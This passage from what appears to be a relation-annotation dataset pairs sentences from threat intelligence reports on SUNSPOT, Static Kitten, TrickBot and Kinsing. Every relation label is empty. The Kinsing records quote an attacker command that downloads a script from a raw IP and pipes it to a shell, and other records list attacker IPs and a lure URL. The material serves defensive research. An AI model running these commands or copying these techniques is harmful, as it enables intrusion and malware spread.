        "S1": "The sample will delay for random intervals between the generation of domains; this interval may be any random value from the ranges 1 to 3 minutes, 30 to 120 minutes, or on error conditions up to 420 to 540 minutes (9 hours).",
        "S2": "Once a domain has been successfully retrieved in a CNAME DNS response the sample will spawn a new thread of execution invoking the method HttpHelper.Initialize which is responsible for all C2 communications and dispatching.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S65<=>S69",
        "S1": "Records within the following ranges will terminate the malware and update the configuration key ReportWatcherRetry to a value that prevents further execution:",
        "S2": "The malware uses HTTP GET or HTTP POST requests.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S66<=>S70",
        "S1": "Once a domain has been successfully retrieved in a CNAME DNS response the sample will spawn a new thread of execution invoking the method HttpHelper.Initialize which is responsible for all C2 communications and dispatching.",
        "S2": "If the sample is attempting to send outbound data the content-type HTTP header will be set to \"application/octet-stream\" otherwise to \"application/json\".",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-68.md::S74<=>S76",
        "S1": "Malware response messages to send to the server are DEFLATE compressed and single-byte-XOR encoded, then split among the \u201cMessage\u201d fields in the \u201csteps\u201d array.",
        "S2": "Not all objects in the \u201csteps\u201d array contribute to the malware message \u2013 the integer in the \u201cTimestamp\u201d field must have the 0x2 bit set to indicate that the contents of the \u201cMessage\u201d field are used in the malware message.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S0<=>S2",
        "S1": "We identified two lure ZIP files being used by Static Kitten designed to trick users into downloading a purported report on relations between Arab countries and Israel, or a file relating to scholarships.",
        "S2": "Anomali Threat Research has identified that Static Kitten is continuing to use Onehub to host a file containing ScreenConnect.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S0<=>S10",
        "S1": "We identified two lure ZIP files being used by Static Kitten designed to trick users into downloading a purported report on relations between Arab countries and Israel, or a file relating to scholarships.",
        "S2": "Static Kitten is distributing at least two URLs that deliver two different ZIP files that are themed to be relevant to government agency employees.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S0<=>S6",
        "S1": "We identified two lure ZIP files being used by Static Kitten designed to trick users into downloading a purported report on relations between Arab countries and Israel, or a file relating to scholarships.",
        "S2": "This EXE purports to be a report on Arabic countries and Israel relations but, when executed, actually launches the installation process for ScreenConnect.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S2<=>S5",
        "S1": "Anomali Threat Research has identified that Static Kitten is continuing to use Onehub to host a file containing ScreenConnect.",
        "S2": "Static Kitten\u2019s objective is to direct users to a downloader URL (ws.onehub[.]com/files/7w1372el which downloads a ZIP file) via a phishing email that impersonates an EXE (\u062a\u062d\u0644\u064a\u0644 \u0648\u062f\u0631\u0627\u0633\u0629 \u062a\u0637\u0628\u064a\u0639 \u0627\u0644\u0639\u0644\u0627\u0642\u0627\u062a \u0627\u0644\u062f\u0648\u0644 \u0627\u0644\u0639\u0631\u0628\u064a\u0629 \u0648\u0627\u0633\u0631\u0627\u0626\u064a\u0644 httpsmod[.]gov.kw.exe).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S2<=>S20",
        "S1": "Anomali Threat Research has identified that Static Kitten is continuing to use Onehub to host a file containing ScreenConnect.",
        "S2": "Between 2016 and 2020, we have seenScreenConnect and Onehub used in malicious cyber activity by different, unassociated threat actors",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S2<=>S6",
        "S1": "Anomali Threat Research has identified that Static Kitten is continuing to use Onehub to host a file containing ScreenConnect.",
        "S2": "This EXE purports to be a report on Arabic countries and Israel relations but, when executed, actually launches the installation process for ScreenConnect.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S5<=>S10",
        "S1": "Static Kitten\u2019s objective is to direct users to a downloader URL (ws.onehub[.]com/files/7w1372el which downloads a ZIP file) via a phishing email that impersonates an EXE (\u062a\u062d\u0644\u064a\u0644 \u0648\u062f\u0631\u0627\u0633\u0629 \u062a\u0637\u0628\u064a\u0639 \u0627\u0644\u0639\u0644\u0627\u0642\u0627\u062a \u0627\u0644\u062f\u0648\u0644 \u0627\u0644\u0639\u0631\u0628\u064a\u0629 \u0648\u0627\u0633\u0631\u0627\u0626\u064a\u0644 httpsmod[.]gov.kw.exe).",
        "S2": "Static Kitten is distributing at least two URLs that deliver two different ZIP files that are themed to be relevant to government agency employees.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S6<=>S8",
        "S1": "This EXE purports to be a report on Arabic countries and Israel relations but, when executed, actually launches the installation process for ScreenConnect.",
        "S2": "An EXE inside the ZIP of the same name will also begin the ScreenConnect installation process when executed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S6<=>S13",
        "S1": "This EXE purports to be a report on Arabic countries and Israel relations but, when executed, actually launches the installation process for ScreenConnect.",
        "S2": "The .docx file shown in Figure 2 directly refers to government agency recipients while highlighting concerns about recent Iranian actions, the impact of the US elections, and joint studies by government entities on relations between Arabic countries and Israel.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S10<=>S19",
        "S1": "Static Kitten is distributing at least two URLs that deliver two different ZIP files that are themed to be relevant to government agency employees.",
        "S2": "The geopolitical-themed ZIP contains an EXE file with the same name that begins the installation process for ScreenConnect when executed (see Figure 4).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S13<=>S16",
        "S1": "The .docx file shown in Figure 2 directly refers to government agency recipients while highlighting concerns about recent Iranian actions, the impact of the US elections, and joint studies by government entities on relations between Arabic countries and Israel.",
        "S2": "The hyperlink in the .docx file is impersonating the UAE National Media Council, however, the actual link directs to ws.onehub.com/files/7w1372el.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S14<=>S16",
        "S1": "The actors reference multiple official agencies, including the General Secretariat of the Cooperation Council for the Arab States of the Gulf and the UAE National Media Council, likely in an effort to add the appearance of legitimacy.",
        "S2": "The hyperlink in the .docx file is impersonating the UAE National Media Council, however, the actual link directs to ws.onehub.com/files/7w1372el.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S14<=>S33",
        "S1": "The actors reference multiple official agencies, including the General Secretariat of the Cooperation Council for the Arab States of the Gulf and the UAE National Media Council, likely in an effort to add the appearance of legitimacy.",
        "S2": "While the actors attempted to make the installation appear legitimate, closer inspection of the client launch parameters reveals the potential for broader MOFA targeting.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S19<=>S23",
        "S1": "The geopolitical-themed ZIP contains an EXE file with the same name that begins the installation process for ScreenConnect when executed (see Figure 4).",
        "S2": "The actors responsible for these attacks used ScreenConnect to connect to endpoints on client networks, enabling them to conduct further lateral movements and automated actions on objectives.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S20<=>S22",
        "S1": "Between 2016 and 2020, we have seenScreenConnect and Onehub used in malicious cyber activity by different, unassociated threat actors",
        "S2": "For example, between 2016 and 2019 unknown threat actors targeted IT outsourcing firms, including compromising US-based Cognizant and India-based Wipro.[7]",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S20<=>S27",
        "S1": "Between 2016 and 2020, we have seenScreenConnect and Onehub used in malicious cyber activity by different, unassociated threat actors",
        "S2": "In 2020, ScreenConnect/ConnectWise has been utilized by the cybercriminal group Pinchy Spider (GOLD SOUTHFIELD, GOLD GARDEN, Sodinokibi, REvil, GandCrab) to distribute Sodinokibi ransomware.[8]",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S22<=>S25",
        "S1": "For example, between 2016 and 2019 unknown threat actors targeted IT outsourcing firms, including compromising US-based Cognizant and India-based Wipro.[7]",
        "S2": "In 2019, another threat group used ConnectWise to execute PowerShell commands in their target environments.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S22<=>S24",
        "S1": "For example, between 2016 and 2019 unknown threat actors targeted IT outsourcing firms, including compromising US-based Cognizant and India-based Wipro.[7]",
        "S2": "During an incident impacting Cognizant and their client Maritz Holdings, actors used ScreenConnect to propagate to other connected systems and caused over $1.8 million (USD) in losses through a gift card fraud scheme.[6]",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S25<=>S27",
        "S1": "In 2019, another threat group used ConnectWise to execute PowerShell commands in their target environments.",
        "S2": "In 2020, ScreenConnect/ConnectWise has been utilized by the cybercriminal group Pinchy Spider (GOLD SOUTHFIELD, GOLD GARDEN, Sodinokibi, REvil, GandCrab) to distribute Sodinokibi ransomware.[8]",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S27<=>S29",
        "S1": "In 2020, ScreenConnect/ConnectWise has been utilized by the cybercriminal group Pinchy Spider (GOLD SOUTHFIELD, GOLD GARDEN, Sodinokibi, REvil, GandCrab) to distribute Sodinokibi ransomware.[8]",
        "S2": "ScreenConnect offers three primary functions that each contain different valuable features for threat actors.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S30<=>S35",
        "S1": "ScreenConnect\u2019s capabilities are shown in Table 1 below.",
        "S2": "While the ScreenConnectclient agent is being installed, the server component expects a connection and the server can identify the client agent through a public key thumbprint.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S33<=>S42",
        "S1": "While the actors attempted to make the installation appear legitimate, closer inspection of the client launch parameters reveals the potential for broader MOFA targeting.",
        "S2": "The actors again created a custom field parameter, however, this one is kept to a generic MOFA targeting that appears as MFA: &c=mfa&c=mfa.gov",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S35<=>S37",
        "S1": "While the ScreenConnectclient agent is being installed, the server component expects a connection and the server can identify the client agent through a public key thumbprint.",
        "S2": "Analysis of the authentic launch parameters passed back to the server as part of Screenconnect functionality is shown in Table 2 below.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S36<=>S38",
        "S1": "The thumbprint is a 16 character string located at \"C:\\Program Files (x86)\\ScreenConnect Client (a97eeae2330a1851)\u201d",
        "S2": "The main launch parameter that indicates this EXE is designed to target MOFAs are the custom c parameters:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-78.md::S38<=>S41",
        "S1": "The main launch parameter that indicates this EXE is designed to target MOFAs are the custom c parameters:",
        "S2": "The ScreenConnect launch parameters from \u0627\u0644\u0645\u0646\u062d \u0627\u0644\u062f\u0631\u0627\u0633\u06cc\u0629 .exe is shown below:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-85.md::S4<=>S6",
        "S1": "These point to various copies of TrickBot installed in the system, usually within the user profile under %USER_DIR%\\AppData\\Roaming\\ or a subdirectory.",
        "S2": "TrickBot may also be installed as a service with names like \u201cControlServiceA\u201d that points to a copy in the system drive root.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-85.md::S6<=>S10",
        "S1": "TrickBot may also be installed as a service with names like \u201cControlServiceA\u201d that points to a copy in the system drive root.",
        "S2": "The TrickBot module used for credential harvesting is pwgrab64 .",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-85.md::S7<=>S9",
        "S1": "WIZARD SPIDER uses a module named NewBCtestnDll64 as a reverse SOCKS proxy that allows for the download and installation of the open source PowerShell Empire post-exploitation framework.",
        "S2": "Each instance of the Updater service connects to a single IP address, and multiple versions may be added at the same time, pointing to different IPs and requesting a .php resource.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-85.md::S9<=>S15",
        "S1": "Each instance of the Updater service connects to a single IP address, and multiple versions may be added at the same time, pointing to different IPs and requesting a .php resource.",
        "S2": "In the investigations reviewed by CrowdStrike Services, the UseLogonCredential registry value was observed having been set to \u201c1\u201d on systems throughout the infrastructure, often in conjunction with TrickBot\u2019s first deployment to the host.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-85.md::S11<=>S13",
        "S1": "As with all modules launched by the TrickBot core, pwgrab64 is installed into a subfolder, usually named either \u201cmodules\u201d or \u201cdata,\u201d and modified the following registry value:",
        "S2": "Older versions of the pwgrab module has a limited scope that targets mail clients, web browsers, FileZilla and WinSCP.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-85.md::S11<=>S15",
        "S1": "As with all modules launched by the TrickBot core, pwgrab64 is installed into a subfolder, usually named either \u201cmodules\u201d or \u201cdata,\u201d and modified the following registry value:",
        "S2": "In the investigations reviewed by CrowdStrike Services, the UseLogonCredential registry value was observed having been set to \u201c1\u201d on systems throughout the infrastructure, often in conjunction with TrickBot\u2019s first deployment to the host.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-85.md::S12<=>S20",
        "S1": "Setting the \u201cUseLogonCredential\u201d value to \u201c1\u201d configures the Windows operating system to store credentials as cleartext in memory, where they can then be retrieved via the use of credential dumping tools.",
        "S2": "Following initial access, GRIM SPIDER focuses on collecting credentials from the compromised hosts and uses existing RDP in an attempt to get a domain administrator account and access to the Windows Domain Controller.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-85.md::S13<=>S18",
        "S1": "Older versions of the pwgrab module has a limited scope that targets mail clients, web browsers, FileZilla and WinSCP.",
        "S2": "This module has a battery of command line, WMI and LDAP queries to gather information, and then exfiltrate the data to GRIM SPIDER for review.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-85.md::S17<=>S25",
        "S1": "TrickBot downloads modules for collecting local system information and scouting the network, primarily part of the networkdll module.",
        "S2": "Using this common administrator tool, GRIM SPIDER can traverse the network, remotely installing TrickBot and adding persistence to new targets.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-85.md::S18<=>S20",
        "S1": "This module has a battery of command line, WMI and LDAP queries to gather information, and then exfiltrate the data to GRIM SPIDER for review.",
        "S2": "Following initial access, GRIM SPIDER focuses on collecting credentials from the compromised hosts and uses existing RDP in an attempt to get a domain administrator account and access to the Windows Domain Controller.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-85.md::S20<=>S24",
        "S1": "Following initial access, GRIM SPIDER focuses on collecting credentials from the compromised hosts and uses existing RDP in an attempt to get a domain administrator account and access to the Windows Domain Controller.",
        "S2": "Subsequently, the adversary copies the Microsoft SysInternals PSTools archive to this system, and executes PsExec.exe , a utility that allows them to move laterally and execute commands on other Windows systems within the infrastructure.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-85.md::S20<=>S23",
        "S1": "Following initial access, GRIM SPIDER focuses on collecting credentials from the compromised hosts and uses existing RDP in an attempt to get a domain administrator account and access to the Windows Domain Controller.",
        "S2": "GRIM SPIDER also has been observed selecting a server to be the primary staging point.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-85.md::S23<=>S25",
        "S1": "GRIM SPIDER also has been observed selecting a server to be the primary staging point.",
        "S2": "Using this common administrator tool, GRIM SPIDER can traverse the network, remotely installing TrickBot and adding persistence to new targets.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-85.md::S24<=>S27",
        "S1": "Subsequently, the adversary copies the Microsoft SysInternals PSTools archive to this system, and executes PsExec.exe , a utility that allows them to move laterally and execute commands on other Windows systems within the infrastructure.",
        "S2": "Once GRIM SPIDER has gained access to credentials and a Domain Controller, or other host management server, they would then stage the Ryuk ransomware on that system and deploy to targets via PsExec.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-85.md::S25<=>S27",
        "S1": "Using this common administrator tool, GRIM SPIDER can traverse the network, remotely installing TrickBot and adding persistence to new targets.",
        "S2": "Once GRIM SPIDER has gained access to credentials and a Domain Controller, or other host management server, they would then stage the Ryuk ransomware on that system and deploy to targets via PsExec.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-85.md::S26<=>S29",
        "S1": "TrickBot also has the shareDll module for propagating to other hosts using the current, active user credentials.",
        "S2": "In observed instances, the deployment and execution of Ryuk occurred in one session, typically lasting 3 to 8 hours.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S4<=>S6",
        "S1": "It then creates an encrypted log file at C:\\Windows\\Temp\\vmware-vmdmp.log .",
        "S2": "Throughout execution, SUNSPOT will log errors to this file, along with other deployment information.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S6<=>S11",
        "S1": "Throughout execution, SUNSPOT will log errors to this file, along with other deployment information.",
        "S2": "An extract of a log file generated by SUNSPOT in a test environment is given below.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S8<=>S10",
        "S1": "Most log lines corresponding to an error contain a step number (e.g., Step19) requiring knowledge of the malware to understand their meaning.",
        "S2": "The step numbering does not follow the actual execution order, suggesting the calls to the logging function were added by the developers during the creation of the malware as they progressed and needed to focus their efforts on debugging one part of the code.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S9<=>S46",
        "S1": "These steps and their mapping to the malware actions are provided at the end of this blog.",
        "S2": "- The following TTPs may be used to characterize the SUNSPOT activity described in this blog:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S10<=>S12",
        "S1": "The step numbering does not follow the actual execution order, suggesting the calls to the logging function were added by the developers during the creation of the malware as they progressed and needed to focus their efforts on debugging one part of the code.",
        "S2": "The malware then grants itself debugging privileges by modifying its security token to add SeDebugPrivilege .",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S11<=>S13",
        "S1": "An extract of a log file generated by SUNSPOT in a test environment is given below.",
        "S2": "This step is a prerequisite for the remainder of SUNSPOT\u2019s execution, which involves reading other processes\u2019 memory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S12<=>S19",
        "S1": "The malware then grants itself debugging privileges by modifying its security token to add SeDebugPrivilege .",
        "S2": "Although the mutex created during the initialization should already prevent multiple process monitoring loops from running, the malware checks for the presence of a second mutex \u2014 {56331e4d-76a3-0390-a7ee-567adf5836b7} .",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S14<=>S17",
        "S1": "After initialization, SUNSPOT monitors running processes for instances of MsBuild.exe , which is part of Microsoft Visual Studio development tools.",
        "S2": "When SUNSPOT finds an MsBuild.exe process, it will spawn a new thread to determine if the Orion software is being built and, if so, hijack the build operation to inject SUNBURST.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S14<=>S26",
        "S1": "After initialization, SUNSPOT monitors running processes for instances of MsBuild.exe , which is part of Microsoft Visual Studio development tools.",
        "S2": "The command line is then parsed to extract individual arguments, and SUNSPOT looks for the directory path of the Orion software Visual Studio solution.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S17<=>S22",
        "S1": "When SUNSPOT finds an MsBuild.exe process, it will spawn a new thread to determine if the Orion software is being built and, if so, hijack the build operation to inject SUNBURST.",
        "S2": "Stopping SUNSPOT in the middle of its operation could result in unfinished tampering of the Orion source code, and lead to Orion build errors that SolarWinds developers would investigate, revealing the adversary\u2019s presence.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S18<=>S22",
        "S1": "The monitoring loop executes every second, allowing SUNSPOT to modify the target source code before it has been read by the compiler.",
        "S2": "Stopping SUNSPOT in the middle of its operation could result in unfinished tampering of the Orion source code, and lead to Orion build errors that SolarWinds developers would investigate, revealing the adversary\u2019s presence.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S22<=>S26",
        "S1": "Stopping SUNSPOT in the middle of its operation could result in unfinished tampering of the Orion source code, and lead to Orion build errors that SolarWinds developers would investigate, revealing the adversary\u2019s presence.",
        "S2": "The command line is then parsed to extract individual arguments, and SUNSPOT looks for the directory path of the Orion software Visual Studio solution.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S24<=>S34",
        "S1": "A call to NtQueryInformationProcess allows the adversary to obtain a pointer to the remote process\u2019s Process Environment Block (PEB), which contains a pointer to a _RTL_USER_PROCESS_PARAMETERS structure.",
        "S2": "As causing build errors would very likely prompt troubleshooting actions from the Orion developers and lead to the adversary\u2019s discovery, the SUNSPOT developers included a hash verification check, likely to ensure the injected backdoored code is compatible with a known source file, and also avoid replacing the file with garbage data from a failed decryption.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S26<=>S31",
        "S1": "The command line is then parsed to extract individual arguments, and SUNSPOT looks for the directory path of the Orion software Visual Studio solution.",
        "S2": "When SUNSPOT finds the Orion solution file path in a running MsBuild.exe process, it replaces a source code file in the solution directory, with a malicious variant to inject SUNBURST while Orion is being built.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S28<=>S30",
        "S1": "The same material is used for all of the blobs encrypted with AES in the binary.",
        "S2": "It is plausible the material was chosen on purpose in order to make static detections on the values impractical.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S29<=>S33",
        "S1": "The key and initialization vector (IV) are not unique and can be independently found in other binary samples of several popular video games.",
        "S2": "The malicious source code for SUNBURST, along with target file paths, are stored in AES128-CBC encrypted blobs and are protected using the same key and initialization vector.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S31<=>S34",
        "S1": "When SUNSPOT finds the Orion solution file path in a running MsBuild.exe process, it replaces a source code file in the solution directory, with a malicious variant to inject SUNBURST while Orion is being built.",
        "S2": "As causing build errors would very likely prompt troubleshooting actions from the Orion developers and lead to the adversary\u2019s discovery, the SUNSPOT developers included a hash verification check, likely to ensure the injected backdoored code is compatible with a known source file, and also avoid replacing the file with garbage data from a failed decryption.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S33<=>S35",
        "S1": "The malicious source code for SUNBURST, along with target file paths, are stored in AES128-CBC encrypted blobs and are protected using the same key and initialization vector.",
        "S2": "In the exemplar SUNSPOT sample, the MD5 hash for the backdoored source code is 5f40b59ee2a9ac94ddb6ab9e3bd776ca .",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S34<=>S44",
        "S1": "As causing build errors would very likely prompt troubleshooting actions from the Orion developers and lead to the adversary\u2019s discovery, the SUNSPOT developers included a hash verification check, likely to ensure the injected backdoored code is compatible with a known source file, and also avoid replacing the file with garbage data from a failed decryption.",
        "S2": "In order to remove compilation warnings that could be generated by the adversary\u2019s own code \u2014 which could alert the SolarWinds developers \u2014 StellarParticle made their edits within #pragma warning disable and #pragma warning restore statements, hinting at what parts were edited.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S34<=>S41",
        "S1": "As causing build errors would very likely prompt troubleshooting actions from the Orion developers and lead to the adversary\u2019s discovery, the SUNSPOT developers included a hash verification check, likely to ensure the injected backdoored code is compatible with a known source file, and also avoid replacing the file with garbage data from a failed decryption.",
        "S2": "If the Orion solution build is successful, it is backdoored with SUNBURST.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S35<=>S38",
        "S1": "In the exemplar SUNSPOT sample, the MD5 hash for the backdoored source code is 5f40b59ee2a9ac94ddb6ab9e3bd776ca .",
        "S2": "The backdoored source is written to the same filename, but with a .tmp extension (e.g., InventoryManager.tmp ), before being moved using MoveFileEx to the original filename ( InventoryManager.cs ).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S36<=>S39",
        "S1": "If the decryption of the parameters (target file path and replacement source code) is successful and if the MD5 checks pass, SUNSPOT proceeds with the replacement of the source file content.",
        "S2": "After these steps, the source file backdoored with SUNBURST will then be compiled as part of the standard process.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S41<=>S43",
        "S1": "If the Orion solution build is successful, it is backdoored with SUNBURST.",
        "S2": "The use of generic variable names, pre-obfuscated strings, and the lack of developer comments or disabled code is similar to what could be obtained after decompiling a backdoored Orion binary, as illustrated in Figure 2, which provides a comparison between the injected source code (top) and a decompilation output (bottom).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S42<=>S45",
        "S1": "The source code of SUNBURST was likely sanitized before being included in SUNSPOT.",
        "S2": "In particular, SUNSPOT\u2019s entry point was added to the legitimate Orion software RefreshInternal function by adding the following try/catch block:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S43<=>S45",
        "S1": "The use of generic variable names, pre-obfuscated strings, and the lack of developer comments or disabled code is similar to what could be obtained after decompiling a backdoored Orion binary, as illustrated in Figure 2, which provides a comparison between the injected source code (top) and a decompilation output (bottom).",
        "S2": "In particular, SUNSPOT\u2019s entry point was added to the legitimate Orion software RefreshInternal function by adding the following try/catch block:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S44<=>S50",
        "S1": "In order to remove compilation warnings that could be generated by the adversary\u2019s own code \u2014 which could alert the SolarWinds developers \u2014 StellarParticle made their edits within #pragma warning disable and #pragma warning restore statements, hinting at what parts were edited.",
        "S2": "- Log entries from different executions of the malware that are separated with a hard-coded value 32 78 A5 E7 1A 79 91 AC",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-107.md::S50<=>S57",
        "S1": "- Log entries from different executions of the malware that are separated with a hard-coded value 32 78 A5 E7 1A 79 91 AC",
        "S2": "- Attempt to open a non-existing mutex to detect when the malware operators want the backdoor to stop execution and safely exit",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-118.md::S0<=>S8",
        "S1": "Taking advantage of the unprotected open Docker API port, the attackers are able to instantiate an Ubuntu container with the following entry point: /bin/bash -c apt-get update && apt-get install -y wget cron;service cron start; wget -q -O - 142.44.191.122/d.sh | sh;tail -f /dev/null",
        "S2": "- Run the shell script and read indefinitely from /dev/null to keep the container alive and running",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-118.md::S0<=>S20",
        "S1": "Taking advantage of the unprotected open Docker API port, the attackers are able to instantiate an Ubuntu container with the following entry point: /bin/bash -c apt-get update && apt-get install -y wget cron;service cron start; wget -q -O - 142.44.191.122/d.sh | sh;tail -f /dev/null",
        "S2": "We are not certain why the attackers chose to do so, but that is what the script executes: crontab -l | sed '/update.sh/d' | crontab -.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-118.md::S2<=>S12",
        "S1": "We witnessed 3 IP addresses used in total--the one in the example above, 217.12.221.244 and 185.92.74.42",
        "S2": "We discovered that the shell script does the following:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-118.md::S5<=>S7",
        "S1": "- Install wget with apt-get",
        "S2": "- Download a shell script with the just installed wget",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-118.md::S8<=>S10",
        "S1": "- Run the shell script and read indefinitely from /dev/null to keep the container alive and running",
        "S2": "The script would be later used in order to gain persistency within the container.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-118.md::S12<=>S18",
        "S1": "We discovered that the shell script does the following:",
        "S2": "- Uses crontab to download and run the shell script every minute",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-118.md::S12<=>S20",
        "S1": "We discovered that the shell script does the following:",
        "S2": "We are not certain why the attackers chose to do so, but that is what the script executes: crontab -l | sed '/update.sh/d' | crontab -.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-118.md::S17<=>S21",
        "S1": "- Downloads the \u2018kinsing\u2019 malware and runs it",
        "S2": "Kinsing is a Linux agent, identified by Virus Total after we submitted it for analysis.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-118.md::S20<=>S42",
        "S1": "We are not certain why the attackers chose to do so, but that is what the script executes: crontab -l | sed '/update.sh/d' | crontab -.",
        "S2": "Using the information gathered, the malware then attempts to connect to each host, using every possible user and key combination through SSH, in order to download the aforementioned shell script and run the malware on other hosts or containers in the network.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-118.md::S20<=>S45",
        "S1": "We are not certain why the attackers chose to do so, but that is what the script executes: crontab -l | sed '/update.sh/d' | crontab -.",
        "S2": "We noticed a comment in the script for a 20 seconds sleep after every 20 SSH connection attempts, and their cleanup, possibly indicating that the attackers have some sense of evasion and were trying to hide their activities.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-118.md::S21<=>S41",
        "S1": "Kinsing is a Linux agent, identified by Virus Total after we submitted it for analysis.",
        "S2": "We did not identify any active scanning techniques used to identify additional targets.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-118.md::S24<=>S30",
        "S1": "It uses several Go libraries, including:",
        "S2": "Running the malware in a controlled environment and monitoring it brought up more details about its malicious actions.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-118.md::S32<=>S36",
        "S1": "It appears that there are dedicated servers for each function that the malware executes:",
        "S2": "The malware communicates with that host over HTTP port 80, and sends small encrypted messages on regular intervals, every few seconds.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-118.md::S36<=>S39",
        "S1": "The malware communicates with that host over HTTP port 80, and sends small encrypted messages on regular intervals, every few seconds.",
        "S2": "The spre.sh shell script that the malware downloads is used to laterally spread the malware across the container network.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-118.md::S37<=>S39",
        "S1": "- Connects to 217.12.221.244/spre.sh, which we presume stands for spread, as we will see in the next paragraph, to download a shell script used for lateral movement purposes.",
        "S2": "The spre.sh shell script that the malware downloads is used to laterally spread the malware across the container network.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-118.md::S39<=>S42",
        "S1": "The spre.sh shell script that the malware downloads is used to laterally spread the malware across the container network.",
        "S2": "Using the information gathered, the malware then attempts to connect to each host, using every possible user and key combination through SSH, in order to download the aforementioned shell script and run the malware on other hosts or containers in the network.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-118.md::S41<=>S45",
        "S1": "We did not identify any active scanning techniques used to identify additional targets.",
